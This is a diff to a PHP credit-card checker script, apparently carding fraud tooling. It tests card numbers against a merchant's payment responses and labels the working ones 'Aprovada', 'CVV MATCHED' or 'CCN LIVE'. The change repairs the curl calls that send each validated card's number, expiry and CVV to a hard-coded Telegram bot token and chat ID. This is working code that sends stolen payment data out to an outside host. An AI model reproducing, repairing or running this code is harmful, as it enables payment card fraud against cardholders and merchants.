@@ -239,9 +239,9 @@ elseif(strpos($result, "token" )) {
   $ch = curl_init();
 //curl_setopt($ch, CURLOPT_PROXY, "http://ca.proxiware.com:22000");
 //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
-  curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot5642962857:AAEdHy_m9-uW5JI-J24fBubUu991bNrAOZI/sendmessage?chat_id=1226634960&text='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv|CVV");
+  curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot5642962857:AAEdHy_m9-uW5JI-J24fBubUu991bNrAOZI/sendmessage?chat_id=1226634960&text=$cc|$mes|$ano|$cvv|CVV");
   curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-  curl_exec($ch);
+  $tes = curl_exec($ch);
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♛ </span></br>';
 }
 elseif(strpos($result, "Thank You." )) {
@@ -251,9 +251,9 @@ elseif(strpos($result, 'security code is invalid' )) {
   $ch = curl_init();
 //curl_setopt($ch, CURLOPT_PROXY, "http://ca");
 //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
-  curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot5642962857:AAEdHy_m9-uW5JI-J24fBubUu991bNrAOZI/sendmessage?chat_id=1226634960&text='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv'|CCN");
+  curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot5642962857:AAEdHy_m9-uW5JI-J24fBubUu991bNrAOZI/sendmessage?chat_id=1226634960&text=$cc|$mes|$ano|$cvv|CCN");
   curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-  curl_exec($ch);
+  $pil = curl_exec($ch);
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✓</span> <span class="badge badge-info"> ★ CCN LIVE CyraX</span></br>';
 }
 elseif(strpos($result, 'security code is incorrect.' )) {
